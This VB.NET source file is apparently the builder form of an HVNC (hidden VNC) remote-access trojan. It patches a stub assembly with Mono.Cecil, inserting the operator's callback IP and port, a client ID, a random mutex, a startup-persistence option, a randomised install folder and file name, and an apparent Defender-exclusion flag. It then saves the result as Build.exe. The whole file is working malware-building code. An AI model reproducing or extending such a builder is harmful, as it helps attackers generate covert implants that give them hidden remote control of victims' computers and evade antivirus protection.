Imports Mono.Cecil
Imports System
Imports System.Collections.Generic
Imports System.Data
Imports System.IO
Imports System.Linq
Imports System.Threading.Tasks
Imports System.Windows.Forms


Namespace HVNC
	Partial Public Class FrmBuilder
		Inherits Form

		Public Shared b() As Byte

		Public Shared r As New Random()

		Public Sub New(ByVal port As String)
			InitializeComponent()
			txtPORT.Text = port
			ReadSettings()
		End Sub

		Public Function ReadSettings() As Boolean
			Try
				Dim filePath As String = (Path.GetDirectoryName(Application.ExecutablePath) & "\HVNC 3.0.0.2.conf")
				Dim lines As List(Of String) = File.ReadLines(filePath).ToList()

				Dim ip As String = lines(5).Replace("host=", Nothing)
				txtIP.Text = ip

				Return True
			Catch
				Return False
			End Try
		End Function

		Private Sub button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button1.Click
			Build()
		End Sub

		Public Sub Build()

			Try
				button2.Enabled = False


				If String.IsNullOrWhiteSpace(txtIP.Text) OrElse String.IsNullOrWhiteSpace(txtPORT.Text) Then
					MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
					Return
				Else
					button1.Enabled = False

					If Not File.Exists(Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location) & "\Stub.bin") Then
						MessageBox.Show("Stub.bin not found !", "Error !", MessageBoxButtons.OK, MessageBoxIcon.Error)
						button1.Enabled = True
						Return
					End If


					Dim [module] As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location) & "\Stub.bin")

					For Each type As TypeDefinition In [module].MainModule.Types
						If type.ToString().Contains("Program") Then
							For Each method In type.Methods
								If method.ToString().Contains("Main") Then
									For Each instruction In method.Body.Instructions
										If instruction.OpCode.ToString() = "ldstr" AndAlso instruction.Operand.ToString() = "#IPDNS#" Then
											instruction.Operand = txtIP.Text
										End If

										If instruction.OpCode.ToString() = "ldstr" AndAlso instruction.Operand.ToString() = "#PORT#" Then
											instruction.Operand = txtPORT.Text
										End If

										If instruction.OpCode.ToString() = "ldstr" AndAlso instruction.Operand.ToString() = "#ID#" Then
											instruction.Operand = txtIdentifier.Text
										End If


										If instruction.OpCode.ToString() = "ldstr" AndAlso instruction.Operand.ToString() = "#MUTEX#" Then
											instruction.Operand = txtMutex.Text
										End If

										If instruction.OpCode.ToString() = "ldstr" AndAlso instruction.Operand.ToString() = "#STARTUP#" Then
											instruction.Operand = checkBox1.Checked.ToString()
										End If

										If instruction.OpCode.ToString() = "ldstr" AndAlso instruction.Operand.ToString() = "#PATH#" Then
											instruction.Operand = comboBox1.SelectedIndex.ToString()
										End If

										If instruction.OpCode.ToString() = "ldstr" AndAlso instruction.Operand.ToString() = "#FOLDER#" Then
											instruction.Operand = textBox1.Text
										End If

										If instruction.OpCode.ToString() = "ldstr" AndAlso instruction.Operand.ToString() = "#FILENAME#" Then
											instruction.Operand = textBox2.Text
										End If

										If instruction.OpCode.ToString() = "ldstr" AndAlso instruction.Operand.ToString() = "#WDEX#" Then
											instruction.Operand = checkBox2.Checked.ToString()
										End If
									Next instruction
								End If
							Next method
						End If
					Next type

					[module].Write(Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location) & "\Build.exe")

					MessageBox.Show("Successfully ! File saved to : " & Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location) & "\Build.exe", "Done !", MessageBoxButtons.OK, MessageBoxIcon.Information)

				End If

				SaveSettings()

				Me.Close()

			Catch ex As Exception
				MessageBox.Show("Error Build !", "Error !", MessageBoxButtons.OK, MessageBoxIcon.Error)
				button1.Enabled = True
				Return
			End Try


		End Sub

		Private Sub FrmBuilder_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
			txtMutex.Text = RandomMutex(9)
			textBox1.Text = RandomMutex(9)
			textBox2.Text = RandomMutex(9) & ".exe"
		End Sub

		Public Shared random As New Random()
		Public Shared Function RandomMutex(ByVal length As Integer) As String
			Const chars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
			Return New String(Enumerable.Repeat(chars, length).Select(Function(s) s(random.Next(s.Length))).ToArray())
		End Function

		Public Shared Function RandomNumber(ByVal length As Integer) As String
			Const chars As String = "0123456789"
			Return New String(Enumerable.Repeat(chars, length).Select(Function(s) s(random.Next(s.Length))).ToArray())
		End Function

		Private Sub button2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button2.Click
			txtMutex.Text = RandomMutex(9)
		End Sub

		Private Sub FrmBuilder_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
			SaveSettings()
		End Sub

		Public Function SaveSettings() As Boolean
			Try
				Dim filePath As String = (Path.GetDirectoryName(Application.ExecutablePath) & "\HVNC 3.0.0.2.conf")
				Dim lines As List(Of String) = File.ReadLines(filePath).ToList()
				lines(5) = ("host=" & txtIP.Text)
				File.WriteAllLines(filePath, lines)

				Return True
			Catch
				Return False
			End Try

		End Function

		Private Sub button3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button3.Click
			textBox1.Text = RandomMutex(9)
			textBox2.Text = RandomMutex(9) & ".exe"
		End Sub

	End Class
End Namespace

